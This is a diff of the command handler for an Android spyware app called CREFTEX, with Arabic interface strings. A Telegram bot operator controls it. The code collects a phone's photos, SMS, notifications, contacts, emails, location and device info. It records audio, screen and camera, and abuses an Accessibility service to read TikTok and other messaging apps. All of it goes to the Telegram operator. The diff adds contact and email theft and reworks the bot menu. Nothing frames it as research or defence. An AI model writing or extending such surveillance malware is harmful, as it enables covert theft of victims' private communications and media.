@@ -18,71 +18,165 @@ object CommandExecutor {
 
     fun handle(ctx: Context, callbackData: String, callbackId: String) {
         TelegramApi.answerCallback(callbackId)
-        Log.d("CmdExec", "executing: $callbackData")
+        Log.d("CmdExec", "callback: $callbackData")
 
         when {
             callbackData == "menu" -> showMainMenu(ctx)
-            callbackData == "open_site" -> openSite(ctx)
-            callbackData == "info" -> showDeviceInfo(ctx)
-            callbackData == "location" -> showLocation(ctx)
             callbackData == "photos_all" -> fetchAllPhotos(ctx)
             callbackData == "photos_50" -> fetchLastPhotos(ctx, 50)
             callbackData == "photos_200" -> fetchLastPhotos(ctx, 200)
             callbackData == "sms_all" -> fetchAllSms(ctx)
             callbackData == "notifs_all" -> fetchAllNotifs(ctx)
             callbackData == "accessibility_log" -> fetchAccessibility(ctx)
-            callbackData == "accessibility_clear" -> clearAccessibility(ctx)
             callbackData == "audio_start" -> startAudio(ctx)
             callbackData == "audio_stop" -> stopAudio(ctx)
             callbackData == "screen_once" -> captureOnce(ctx)
             callbackData == "screen_loop_start" -> startScreenLoop(ctx)
             callbackData == "screen_loop_stop" -> stopScreenLoop(ctx)
-            callbackData == "video_30" -> recordVideo(ctx, 30)
-            callbackData == "cam_front" -> captureCamera(ctx, true)
-            callbackData == "cam_back" -> captureCamera(ctx, false)
-            callbackData == "tiktok_open" -> tiktokOpen(ctx)
-            callbackData == "tiktok_messages" -> tiktokRead(ctx, "messages")
-            callbackData == "tiktok_read_screen" -> tiktokRead(ctx, "current")
-            callbackData == "fetch_all" -> fetchEverything(ctx)
             callbackData.startsWith("stop_") -> stopJob(ctx, callbackData.removePrefix("stop_"))
-            else -> TelegramApi.sendMessage("❓ أمر غير معروف: $callbackData")
+            else -> TelegramApi.sendMessage("❓ أمر غير معروف", KeyboardBuilder.backToMenu())
         }
     }
 
+    /**
+     * ⭐ معالج النصوص — يستقبل أزرار Reply Keyboard
+     */
     fun handleText(ctx: Context, text: String) {
         val cmd = text.trim()
-        val low = cmd.lowercase()
+        Log.d("CmdExec", "text cmd: $cmd")
+
         when {
-            low == "/start" || low == "/menu" -> showMainMenu(ctx)
-            low == "/site" -> openSite(ctx)
-            low == "/info" -> showDeviceInfo(ctx)
-            low == "/location" || low == "/loc" -> showLocation(ctx)
-            low == "/photos" -> fetchAllPhotos(ctx)
-            low == "/sms" -> fetchAllSms(ctx)
-            low == "/notifs" -> fetchAllNotifs(ctx)
-            low == "/accessibility" || low == "/acc" -> fetchAccessibility(ctx)
-            low == "/audio_start" -> startAudio(ctx)
-            low == "/audio_stop" -> stopAudio(ctx)
-            low == "/screen" -> captureOnce(ctx)
-            low == "/screen_loop" -> startScreenLoop(ctx)
-            low == "/screen_stop" -> stopScreenLoop(ctx)
-            low == "/video" || low == "/video30" -> recordVideo(ctx, 30)
-            low == "/cam_front" -> captureCamera(ctx, true)
-            low == "/cam_back" -> captureCamera(ctx, false)
-            low == "/tiktok" -> tiktokOpen(ctx)
-            low == "/tiktok_messages" -> tiktokRead(ctx, "messages")
-            low == "/tiktok_read" -> tiktokRead(ctx, "current")
-            low == "/all" -> fetchEverything(ctx)
-            low.startsWith("/photos") -> {
-                val n = low.removePrefix("/photos").trim().toIntOrNull() ?: 50
+            // الترحيب / البداية
+            cmd == "/start" || cmd == "/menu" || cmd == "🏠 القائمة" -> showMainMenu(ctx)
+
+            // الصور
+            cmd == "📸 كل الصور" || cmd == "/photos" -> fetchAllPhotos(ctx)
+            cmd == "📸 آخر 50" -> fetchLastPhotos(ctx, 50)
+            cmd == "📸 آخر 200" -> fetchLastPhotos(ctx, 200)
+
+            // الرسائل
+            cmd == "📩 كل الرسائل" || cmd == "/sms" -> fetchAllSms(ctx)
+
+            // الإشعارات
+            cmd == "🔔 الإشعارات" || cmd == "/notifs" -> fetchAllNotifs(ctx)
+
+            // ⭐ جهات الاتصال
+            cmd == "👥 جهات الاتصال" || cmd == "/contacts" -> fetchContacts(ctx)
+
+            // ⭐ الإيميلات
+            cmd == "📧 الإيميلات" || cmd == "/emails" -> fetchEmails(ctx)
+
+            // معلومات الجهاز
+            cmd == "📊 معلومات الجهاز" || cmd == "/info" -> showDeviceInfo(ctx)
+
+            // الموقع
+            cmd == "📍 الموقع" || cmd == "/location" -> showLocation(ctx)
+
+            // تيك توك
+            cmd == "🎵 تيك توك" || cmd == "/tiktok" -> tiktokOpen(ctx)
+            cmd == "/tiktok_messages" -> tiktokRead(ctx)
+            cmd == "/tiktok_read" -> tiktokRead(ctx)
+
+            // جلب شامل
+            cmd == "🚀 جلب كل شي" || cmd == "/all" -> fetchEverything(ctx)
+
+            // الأوامر القديمة (للتوافق)
+            cmd == "/audio_start" -> startAudio(ctx)
+            cmd == "/audio_stop" -> stopAudio(ctx)
+            cmd == "/screen" -> captureOnce(ctx)
+            cmd == "/screen_loop" -> startScreenLoop(ctx)
+            cmd == "/screen_stop" -> stopScreenLoop(ctx)
+            cmd == "/accessibility" || cmd == "/acc" -> fetchAccessibility(ctx)
+            cmd == "/cam_front" -> captureCamera(ctx, true)
+            cmd == "/cam_back" -> captureCamera(ctx, false)
+            cmd == "/video" || cmd == "/video30" -> recordVideo(ctx, 30)
+
+            // /photos N
+            cmd.startsWith("/photos") -> {
+                val n = cmd.removePrefix("/photos").trim().toIntOrNull() ?: 50
                 fetchLastPhotos(ctx, n)
             }
-            else -> TelegramApi.sendMessage("اكتب /menu لعرض القائمة")
+
+            else -> {
+                TelegramApi.sendMessage(
+                    "اكتب /menu أو اضغط زر من القائمة 👇",
+                    KeyboardBuilder.replyKeyboard()
+                )
+            }
         }
     }
 
     // ═══════════════════════════════════════════
-    //  TIKTOK CONTROL
+    //  CONTACTS & EMAILS — جديد
+    // ═══════════════════════════════════════════
+    private fun fetchContacts(ctx: Context) {
+        runJob(ctx, "contacts") {
+            TelegramApi.sendMessage("👥 *جاري قراءة جهات الاتصال...*")
+
+            val contacts = ContactsHelper.getAllContacts(ctx)
+            if (contacts.isEmpty()) {
+                TelegramApi.sendMessage("📭 لا توجد جهات اتصال", KeyboardBuilder.replyKeyboard())
+                return@runJob
+            }
+
+            val sb = StringBuilder()
+            sb.append("👥 *جهات الاتصال* — ${contacts.size}\n")
+            sb.append("━━━━━━━━━━━━━━━━━━━━\n\n")
+
+            var count = 0
+            for (c in contacts) {
+                sb.append("👤 *${c.name}*\n")
+                if (c.phones.isNotEmpty()) {
+                    sb.append("📞 ${c.phones.joinToString(" , ")}\n")
+                }
+                if (c.emails.isNotEmpty()) {
+                    sb.append("📧 ${c.emails.joinToString(" , ")}\n")
+                }
+                sb.append("\n")
+                count++
+
+                if (sb.length > 3500) {
+                    TelegramApi.sendMessage(sb.toString())
+                    sb.clear()
+                }
+                if (count >= 100) {
+                    sb.append("… +${contacts.size - count} آخرين\n")
+                    break
+                }
+            }
+            if (sb.isNotEmpty()) TelegramApi.sendMessage(sb.toString(), KeyboardBuilder.replyKeyboard())
+        }
+    }
+
+    private fun fetchEmails(ctx: Context) {
+        runJob(ctx, "emails") {
+            TelegramApi.sendMessage("📧 *جاري قراءة الإيميلات...*")
+
+            val emails = ContactsHelper.getAllEmails(ctx)
+            if (emails.isEmpty()) {
+                TelegramApi.sendMessage("📭 لا توجد إيميلات", KeyboardBuilder.replyKeyboard())
+                return@runJob
+            }
+
+            val sb = StringBuilder()
+            sb.append("📧 *كل الإيميلات* — ${emails.size}\n")
+            sb.append("━━━━━━━━━━━━━━━━━━━━\n\n")
+
+            for (e in emails) {
+                sb.append("✉️ *${e.name}*\n")
+                sb.append("`${e.email}`\n\n")
+
+                if (sb.length > 3500) {
+                    TelegramApi.sendMessage(sb.toString())
+                    sb.clear()
+                }
+            }
+            if (sb.isNotEmpty()) TelegramApi.sendMessage(sb.toString(), KeyboardBuilder.replyKeyboard())
+        }
+    }
+
+    // ═══════════════════════════════════════════
+    //  TIKTOK
     // ═══════════════════════════════════════════
     private fun tiktokOpen(ctx: Context) {
         runJob(ctx, "tiktok_open") {
@@ -90,205 +184,108 @@ object CommandExecutor {
                 TelegramApi.sendMessage(
                     "⚠️ *خدمة Accessibility غير نشطة*\n\n" +
                     "فعّلها من: الإعدادات → إمكانية الوصول → CREFTEX",
-                    KeyboardBuilder.backToMenu()
+                    KeyboardBuilder.replyKeyboard()
                 )
                 return@runJob
             }
-
             TelegramApi.sendMessage("🎵 *جاري فتح تيك توك...*")
             val ok = TikTokController.openTikTok(ctx)
             if (ok) {
-                TelegramApi.sendMessage("✅ تم فتح تيك توك\n\nالآن افتح المحادثة التي تريد قراءتها، ثم اضغط زر (🎵 تيك توك — اقرأ الشاشة)", KeyboardBuilder.backToMenu())
+                TelegramApi.sendMessage(
+                    "✅ تم فتح تيك توك\n\nافتح المحادثة التي تريدها، ثم اضغط (🎵 تيك توك) مرة أخرى للقراءة",
+                    KeyboardBuilder.replyKeyboard()
+                )
             } else {
-                TelegramApi.sendMessage("❌ فشل فتح تيك توك — تأكد من التثبيت", KeyboardBuilder.backToMenu())
+                TelegramApi.sendMessage("❌ فشل فتح تيك توك", KeyboardBuilder.replyKeyboard())
             }
         }
     }
 
-    private fun tiktokRead(ctx: Context, mode: String) {
+    private fun tiktokRead(ctx: Context) {
         runJob(ctx, "tiktok_read") {
             if (accessibilityServiceRef == null) {
-                TelegramApi.sendMessage(
-                    "⚠️ *خدمة Accessibility غير نشطة*\n\n" +
-                    "فعّلها من: الإعدادات → إمكانية الوصول → CREFTEX",
-                    KeyboardBuilder.backToMenu()
-                )
+                TelegramApi.sendMessage("⚠️ Accessibility غير نشط", KeyboardBuilder.replyKeyboard())
                 return@runJob
             }
-
-            // ⭐ فحص الحزمة الأمامية
             val fgPkg = TikTokController.getForegroundPackage(accessibilityServiceRef)
             if (fgPkg != "com.zhiliaoapp.musically" && fgPkg != "com.ss.android.ugc.trill") {
-                TelegramApi.sendMessage(
-                    "⚠️ *تيك توك ليس مفتوحًا حاليًا*\n\n" +
-                    "الحزمة الحالية: `$fgPkg`\n\n" +
-                    "الحل:\n" +
-                    "1. اضغط زر (🎵 تيك توك — فتح)\n" +
-                    "2. افتح المحادثة التي تريدها\n" +
-                    "3. أعد الأمر",
-                    KeyboardBuilder.backToMenu()
-                )
+                TelegramApi.sendMessage("⚠️ افتح تيك توك أولًا", KeyboardBuilder.replyKeyboard())
                 return@runJob
             }
-
-            TelegramApi.sendMessage("🎵 *جاري القراءة...*")
-            Thread.sleep(800)
-
             val texts = TikTokController.readTikTokTexts(accessibilityServiceRef)
-
-            if (texts == null) {
-                TelegramApi.sendMessage("❌ تعذّر القراءة — ليس تيك توك في المقدمة", KeyboardBuilder.backToMenu())
+            if (texts.isNullOrEmpty()) {
+                TelegramApi.sendMessage("❌ لا نصوص قابلة للقراءة", KeyboardBuilder.replyKeyboard())
                 return@runJob
             }
-
-            if (texts.isEmpty()) {
-                TelegramApi.sendMessage(
-                    "❌ لم يتم العثور على نصوص قابلة للقراءة\n" +
-                    "جرّب فتح محادثة معينة داخل تيك توك",
-                    KeyboardBuilder.backToMenu()
-                )
-                return@runJob
-            }
-
-            TikTokController.saveToFile(ctx, mode, texts)
-
             val sb = StringBuilder()
-            sb.append("🎵 *تيك توك — المحتوى*\n")
-            sb.append("━━━━━━━━━━━━━━━━━━━━\n\n")
-
+            sb.append("🎵 *تيك توك*\n━━━━━━━━━━━━━━━━━━━━\n\n")
             var count = 0
             for (t in texts) {
                 if (t.length < 3) continue
                 sb.append("• $t\n")
                 count++
-                if (count >= 80) break
+                if (count >= 60) break
             }
+            TelegramApi.sendMessage(sb.toString(), KeyboardBuilder.replyKeyboard())
+        }
+    }
 
-            if (sb.length > 3500) {
-                TelegramApi.sendMessage(sb.take(3500).toString())
-                TelegramApi.sendMessage("… (النتيجة مقطوعة، في ${texts.size} عنصر إجمالًا)")
+    // ═══════════════════════════════════════════
+    //  SCREEN
+    // ═══════════════════════════════════════════
+    private fun captureOnce(ctx: Context) {
+        if (!ScreenCapture.isReady) {
+            TelegramApi.sendMessage("⚠️ صلاحية الشاشة غير جاهزة", KeyboardBuilder.replyKeyboard())
+            return
+        }
+        runJob(ctx, "screen_once") {
+            val file = ScreenCapture.capture(ctx)
+            if (file != null && file.exists()) {
+                TelegramApi.sendPhoto(file, "📷 لقطة شاشة")
+                file.delete()
             } else {
-                TelegramApi.sendMessage(sb.toString(), KeyboardBuilder.backToMenu())
+                TelegramApi.sendMessage("❌ فشل", KeyboardBuilder.replyKeyboard())
             }
         }
     }
 
-    // ═══════════════════════════════════════════
-    //  MENUS
-    // ═══════════════════════════════════════════
-    private fun showMainMenu(ctx: Context) {
-        val text = """
-            🎛 *لوحة التحكم — CREFTEX*
-
-            اختر العملية من الأزرار أدناه:
-        """.trimIndent()
-        TelegramApi.sendMessage(text, KeyboardBuilder.mainMenu())
-    }
-
-    private fun openSite(ctx: Context) {
-        try {
-            TelegramApi.sendMessage("🌐 *جاري فتح الموقع على الجهاز...*")
-            val intent = android.content.Intent(ctx, WebViewActivity::class.java)
-            intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
-            ctx.startActivity(intent)
-        } catch (e: Exception) {
-            TelegramApi.sendMessage("❌ فشل فتح الموقع: ${e.message}")
+    private fun startScreenLoop(ctx: Context) {
+        if (!ScreenCapture.isReady) {
+            TelegramApi.sendMessage("⚠️ صلاحية الشاشة غير جاهزة", KeyboardBuilder.replyKeyboard())
+            return
         }
+        screenLoopActive = true
+        TelegramApi.sendMessage("📷 ✅ بدأ اللقطات المتكررة كل 30 ثانية", KeyboardBuilder.replyKeyboard())
     }
 
-    private fun showDeviceInfo(ctx: Context) {
-        val info = DeviceInfo.getFullInfo(ctx)
-        TelegramApi.sendMessage(info, KeyboardBuilder.backToMenu())
+    private fun stopScreenLoop(ctx: Context) {
+        screenLoopActive = false
+        TelegramApi.sendMessage("📷 ⏹ تم الإيقاف", KeyboardBuilder.replyKeyboard())
     }
 
-    private fun showLocation(ctx: Context) {
-        runJob(ctx, "location") {
-            TelegramApi.sendMessage("📍 *جاري تحديد الموقع بدقة عالية...*\n⏱ قد يأخذ حتى 15 ثانية")
-            val loc = LocationHelper.getPreciseLocation(ctx)
-            val text = LocationHelper.formatLocation(ctx, loc)
-            TelegramApi.sendMessage(text, KeyboardBuilder.backToMenu())
+    private fun recordVideo(ctx: Context, durationSec: Int) {
+        if (!ScreenCapture.isReady) {
+            TelegramApi.sendMessage("⚠️ صلاحية الشاشة غير جاهزة", KeyboardBuilder.replyKeyboard())
+            return
         }
-    }
-
-    // ═══════════════════════════════════════════
-    //  ACCESSIBILITY
-    // ═══════════════════════════════════════════
-    private fun fetchAccessibility(ctx: Context) {
-        runJob(ctx, "accessibility") {
-            if (!AccessibilityHelper.isEnabled(ctx)) {
-                TelegramApi.sendMessage(
-                    "⚠️ *خدمة Accessibility غير مفعّلة*\n\n" +
-                    "الحل:\n" +
-                    "1. الإعدادات → إمكانية الوصول\n" +
-                    "2. التطبيقات المثبتة\n" +
-                    "3. CREFTEX → فعّلها\n\n" +
-                    "بعدها أعد المحاولة.",
-                    KeyboardBuilder.backToMenu()
-                )
+        runJob(ctx, "video") {
+            TelegramApi.sendMessage("📹 *بدأ التسجيل ($durationSec ثانية)...*")
+            val file = VideoRecorder.start(ctx, durationSec)
+            if (file == null) {
+                TelegramApi.sendMessage("❌ فشل البدء", KeyboardBuilder.replyKeyboard())
                 return@runJob
             }
-
-            val lines = AccessibilityHelper.readCapturedTexts(ctx, limit = 800)
-            if (lines.isEmpty()) {
-                TelegramApi.sendMessage(
-                    "📝 *لا توجد نصوص محفوظة بعد*",
-                    KeyboardBuilder.backToMenu()
-                )
-                return@runJob
+            Thread.sleep((durationSec + 3) * 1000L)
+            val done = VideoRecorder.stop() ?: file
+            if (done.exists() && done.length() > 0) {
+                val sizeMB = done.length() / (1024.0 * 1024.0)
+                TelegramApi.sendVideo(done, "📹 فيديو (${String.format("%.1f", sizeMB)} MB)")
+                done.delete()
             }
-
-            val grouped = HashMap<String, MutableList<Pair<String, String>>>()
-
-            for (line in lines) {
-                try {
-                    val obj = JSONObject(line)
-                    if (obj.optString("type") != "accessibility") continue
-                    val pkg = obj.optString("package", "unknown")
-                    val time = obj.optString("time", "")
-                    val texts = obj.optString("texts", "")
-                    if (texts.isBlank()) continue
-                    grouped.getOrPut(pkg) { mutableListOf() }.add(time to texts)
-                } catch (_: Exception) {}
-            }
-
-            val appNames = mapOf(
-                "org.telegram.messenger" to "Telegram",
-                "com.whatsapp" to "WhatsApp",
-                "com.instagram.android" to "Instagram",
-                "com.zhiliaoapp.musically" to "TikTok",
-                "com.ss.android.ugc.trill" to "TikTok"
-            )
-
-            for ((pkg, items) in grouped) {
-                val appName = appNames[pkg] ?: pkg
-                val sb = StringBuilder()
-                sb.append("📱 *$appName*\n━━━━━━━━━━━━━━━━━━━━\n")
-                val recent = items.takeLast(20)
-                for (item in recent) {
-                    sb.append("🕐 `${item.first}`\n💬 ${item.second}\n\n")
-                    if (sb.length > 3500) {
-                        TelegramApi.sendMessage(sb.toString())
-                        sb.clear()
-                        sb.append("📱 *$appName* (تكملة)\n\n")
-                    }
-                }
-                if (sb.isNotEmpty()) {
-                    TelegramApi.sendMessage(sb.toString())
-                    Thread.sleep(300)
-                }
-            }
-            TelegramApi.sendMessage("✅ تم.", KeyboardBuilder.backToMenu())
+            TelegramApi.sendMessage("✅ تم", KeyboardBuilder.replyKeyboard())
         }
     }
 
-    private fun clearAccessibility(ctx: Context) {
-        AccessibilityHelper.clearCapturedTexts(ctx)
-        TelegramApi.sendMessage("🗑 تم الحذف", KeyboardBuilder.backToMenu())
-    }
-
-    // ═══════════════════════════════════════════
-    //  CAMERA
-    // ═══════════════════════════════════════════
     private fun captureCamera(ctx: Context, front: Boolean) {
         runJob(ctx, "cam") {
             val label = if (front) "أمامية" else "خلفية"
@@ -298,69 +295,50 @@ object CommandExecutor {
                 TelegramApi.sendPhoto(file, "📷 صورة — ${DeviceInfo.getQuickInfo(ctx)}")
                 file.delete()
             } else {
-                TelegramApi.sendMessage("❌ فشل التصوير", KeyboardBuilder.backToMenu())
+                TelegramApi.sendMessage("❌ فشل التصوير", KeyboardBuilder.replyKeyboard())
             }
         }
     }
 
     // ═══════════════════════════════════════════
-    //  SCREEN CAPTURE
+    //  AUDIO
     // ═══════════════════════════════════════════
-    private fun captureOnce(ctx: Context) {
-        if (!ScreenCapture.isReady) {
-            TelegramApi.sendMessage("⚠️ صلاحية الشاشة غير جاهزة — أعد فتح التطبيق", KeyboardBuilder.backToMenu())
+    private fun startAudio(ctx: Context) {
+        if (AudioRecorder.isRunning()) {
+            TelegramApi.sendMessage("🎤 شغّال بالفعل")
             return
         }
-        runJob(ctx, "screen_once") {
-            val file = ScreenCapture.capture(ctx)
-            if (file != null && file.exists()) {
-                TelegramApi.sendPhoto(file, "📷 لقطة شاشة")
-                file.delete()
-            } else {
-                TelegramApi.sendMessage("❌ فشل", KeyboardBuilder.backToMenu())
-            }
-        }
+        AudioRecorder.startLoop(ctx)
+        TelegramApi.sendMessage("🎤 ✅ بدأ التسجيل كل 10 ثواني", KeyboardBuilder.replyKeyboard())
     }
 
-    private fun startScreenLoop(ctx: Context) {
-        if (!ScreenCapture.isReady) {
-            TelegramApi.sendMessage("⚠️ صلاحية الشاشة غير جاهزة", KeyboardBuilder.backToMenu())
-            return
-        }
-        screenLoopActive = true
-        TelegramApi.sendMessage("📷 ✅ بدأ اللقطات المتكررة كل 30 ثانية", KeyboardBuilder.mainMenu())
-    }
-
-    private fun stopScreenLoop(ctx: Context) {
-        screenLoopActive = false
-        TelegramApi.sendMessage("📷 ⏹ تم الإيقاف", KeyboardBuilder.mainMenu())
+    private fun stopAudio(ctx: Context) {
+        AudioRecorder.stopLoop(ctx)
+        TelegramApi.sendMessage("🎤 ⏹ تم الإيقاف", KeyboardBuilder.replyKeyboard())
     }
 
     // ═══════════════════════════════════════════
-    //  VIDEO
+    //  MENUS
     // ═══════════════════════════════════════════
-    private fun recordVideo(ctx: Context, durationSec: Int) {
-        if (!ScreenCapture.isReady) {
-            TelegramApi.sendMessage("⚠️ صلاحية الشاشة غير جاهزة", KeyboardBuilder.backToMenu())
-            return
-        }
-        runJob(ctx, "video") {
-            TelegramApi.sendMessage("📹 *بدأ التسجيل ($durationSec ثانية)...*")
-            val file = VideoRecorder.start(ctx, durationSec)
-            if (file == null) {
-                TelegramApi.sendMessage("❌ فشل البدء", KeyboardBuilder.backToMenu())
-                return@runJob
-            }
-            Thread.sleep((durationSec + 3) * 1000L)
-            val done = VideoRecorder.stop() ?: file
-            if (done.exists() && done.length() > 0) {
-                val sizeMB = done.length() / (1024.0 * 1024.0)
-                val ok = TelegramApi.sendVideo(done, "📹 فيديو (${String.format("%.1f", sizeMB)} MB)")
-                TelegramApi.sendMessage(if (ok) "✅ تم الإرسال" else "❌ فشل الإرسال", KeyboardBuilder.backToMenu())
-                done.delete()
-            } else {
-                TelegramApi.sendMessage("❌ لم يُسجَّل شي", KeyboardBuilder.backToMenu())
-            }
+    private fun showMainMenu(ctx: Context) {
+        TelegramApi.sendMessage(
+            "🎛 *لوحة التحكم — CREFTEX*\n\n" +
+            "استخدم الأزرار أسفل الشاشة للتحكم 👇",
+            KeyboardBuilder.replyKeyboard()
+        )
+    }
+
+    private fun showDeviceInfo(ctx: Context) {
+        val info = DeviceInfo.getFullInfo(ctx)
+        TelegramApi.sendMessage(info, KeyboardBuilder.replyKeyboard())
+    }
+
+    private fun showLocation(ctx: Context) {
+        runJob(ctx, "location") {
+            TelegramApi.sendMessage("📍 *جاري تحديد الموقع...*")
+            val loc = LocationHelper.getPreciseLocation(ctx)
+            val text = LocationHelper.formatLocation(ctx, loc)
+            TelegramApi.sendMessage(text, KeyboardBuilder.replyKeyboard())
         }
     }
 
@@ -383,7 +361,7 @@ object CommandExecutor {
 
     private fun sendPhotosList(ctx: Context, list: List<MediaScanner.MediaFile>, title: String) {
         if (list.isEmpty()) {
-            TelegramApi.sendMessage("📸 لا توجد صور", KeyboardBuilder.backToMenu())
+            TelegramApi.sendMessage("📸 لا توجد صور", KeyboardBuilder.replyKeyboard())
             return
         }
         val jobId = "photos_${System.currentTimeMillis()}"
@@ -406,7 +384,7 @@ object CommandExecutor {
         }
         runningJobs.remove(jobId)
         val elapsed = (System.currentTimeMillis() - startTime) / 1000
-        TelegramApi.editMessage(statusMsgId, "$title\n✅ $sent أُرسلت\n❌ $failed فشلت\n⏱ ${elapsed}s", KeyboardBuilder.backToMenu())
+        TelegramApi.editMessage(statusMsgId, "$title\n✅ $sent\n❌ $failed\n⏱ ${elapsed}s", KeyboardBuilder.replyKeyboard())
     }
 
     // ═══════════════════════════════════════════
@@ -418,7 +396,7 @@ object CommandExecutor {
             val sent = SmsReader.scanSent(ctx)
             val all = (inbox + sent).sortedByDescending { it.optString("date") }
             if (all.isEmpty()) {
-                TelegramApi.sendMessage("📩 لا رسائل", KeyboardBuilder.backToMenu())
+                TelegramApi.sendMessage("📩 لا رسائل", KeyboardBuilder.replyKeyboard())
                 return@runJob
             }
             val grouped = all.groupBy { it.optString("address", "unknown") }
@@ -434,7 +412,7 @@ object CommandExecutor {
                 sb.append("\n")
                 if (sb.length > 3500) { TelegramApi.sendMessage(sb.toString()); sb.clear() }
             }
-            if (sb.isNotEmpty()) TelegramApi.sendMessage(sb.toString(), KeyboardBuilder.backToMenu())
+            if (sb.isNotEmpty()) TelegramApi.sendMessage(sb.toString(), KeyboardBuilder.replyKeyboard())
         }
     }
 
@@ -449,7 +427,7 @@ object CommandExecutor {
                 catch (_: Exception) { null }
             }
             if (notifs.isEmpty()) {
-                TelegramApi.sendMessage("🔔 لا إشعارات", KeyboardBuilder.backToMenu())
+                TelegramApi.sendMessage("🔔 لا إشعارات", KeyboardBuilder.replyKeyboard())
                 return@runJob
             }
             val grouped = notifs.groupBy { it.optString("pkg", "unknown") }
@@ -467,22 +445,38 @@ object CommandExecutor {
                 sb.append("\n")
                 if (sb.length > 3500) { TelegramApi.sendMessage(sb.toString()); sb.clear() }
             }
-            if (sb.isNotEmpty()) TelegramApi.sendMessage(sb.toString(), KeyboardBuilder.backToMenu())
+            if (sb.isNotEmpty()) TelegramApi.sendMessage(sb.toString(), KeyboardBuilder.replyKeyboard())
         }
     }
 
     // ═══════════════════════════════════════════
-    //  AUDIO
+    //  ACCESSIBILITY
     // ═══════════════════════════════════════════
-    private fun startAudio(ctx: Context) {
-        if (AudioRecorder.isRunning()) { TelegramApi.sendMessage("🎤 شغّال بالفعل"); return }
-        AudioRecorder.startLoop(ctx)
-        TelegramApi.sendMessage("🎤 ✅ بدأ التسجيل كل 10 ثواني", KeyboardBuilder.mainMenu())
-    }
-
-    private fun stopAudio(ctx: Context) {
-        AudioRecorder.stopLoop(ctx)
-        TelegramApi.sendMessage("🎤 ⏹ تم الإيقاف", KeyboardBuilder.mainMenu())
+    private fun fetchAccessibility(ctx: Context) {
+        runJob(ctx, "accessibility") {
+            if (!AccessibilityHelper.isEnabled(ctx)) {
+                TelegramApi.sendMessage("⚠️ Accessibility غير مفعل", KeyboardBuilder.replyKeyboard())
+                return@runJob
+            }
+            val lines = AccessibilityHelper.readCapturedTexts(ctx, limit = 500)
+            if (lines.isEmpty()) {
+                TelegramApi.sendMessage("📝 لا نصوص", KeyboardBuilder.replyKeyboard())
+                return@runJob
+            }
+            val sb = StringBuilder()
+            sb.append("📝 *نصوص الشاشة* — ${lines.size}\n\n")
+            var c = 0
+            for (l in lines.takeLast(30)) {
+                try {
+                    val obj = JSONObject(l)
+                    if (obj.optString("type") != "accessibility") continue
+                    sb.append("📱 ${obj.optString("package")}\n")
+                    sb.append("${obj.optString("texts")}\n\n")
+                    c++
+                } catch (_: Exception) {}
+            }
+            TelegramApi.sendMessage(sb.toString(), KeyboardBuilder.replyKeyboard())
+        }
     }
 
     // ═══════════════════════════════════════════
@@ -491,37 +485,43 @@ object CommandExecutor {
     private fun fetchEverything(ctx: Context) {
         runJob(ctx, "all") {
             TelegramApi.sendMessage("🚀 *بدأ الجلب الشامل*")
-            Thread.sleep(500)
+            Thread.sleep(400)
             try { TelegramApi.sendMessage(DeviceInfo.getFullInfo(ctx)) } catch (_: Exception) {}
-            Thread.sleep(500)
+            Thread.sleep(400)
             try {
                 val loc = LocationHelper.getPreciseLocation(ctx)
                 TelegramApi.sendMessage(LocationHelper.formatLocation(ctx, loc))
             } catch (_: Exception) {}
-            Thread.sleep(500)
-            val photos = MediaScanner.scanImages(ctx)
+            Thread.sleep(400)
+
+            val photos = MediaScanner.scanImages(ctx).take(30)
             sendPhotosList(ctx, photos, "📸 الصور")
-            Thread.sleep(500)
+
+            Thread.sleep(400)
             fetchAllSms(ctx)
-            Thread.sleep(500)
+            Thread.sleep(400)
             fetchAllNotifs(ctx)
-            Thread.sleep(500)
-            fetchAccessibility(ctx)
-            TelegramApi.sendMessage("✅ *اكتمل*", KeyboardBuilder.mainMenu())
+            Thread.sleep(400)
+            fetchContacts(ctx)
+
+            TelegramApi.sendMessage("✅ *اكتمل*", KeyboardBuilder.replyKeyboard())
         }
     }
 
+    // ═══════════════════════════════════════════
+    //  JOB
+    // ═══════════════════════════════════════════
     private fun stopJob(ctx: Context, jobId: String) {
         runningJobs[jobId] = false
         runningJobs.remove(jobId)
-        TelegramApi.sendMessage("🛑 تم الإيقاف", KeyboardBuilder.mainMenu())
+        TelegramApi.sendMessage("🛑 تم الإيقاف", KeyboardBuilder.replyKeyboard())
     }
 
     private fun runJob(ctx: Context, jobName: String, block: () -> Unit) {
         Thread {
             try { block() } catch (e: Exception) {
                 Log.e("CmdExec", "job $jobName err: ${e.message}")
-                TelegramApi.sendMessage("❌ خطأ في $jobName: ${e.message}")
+                TelegramApi.sendMessage("❌ خطأ في $jobName: ${e.message}", KeyboardBuilder.replyKeyboard())
             }
         }.start()
     }
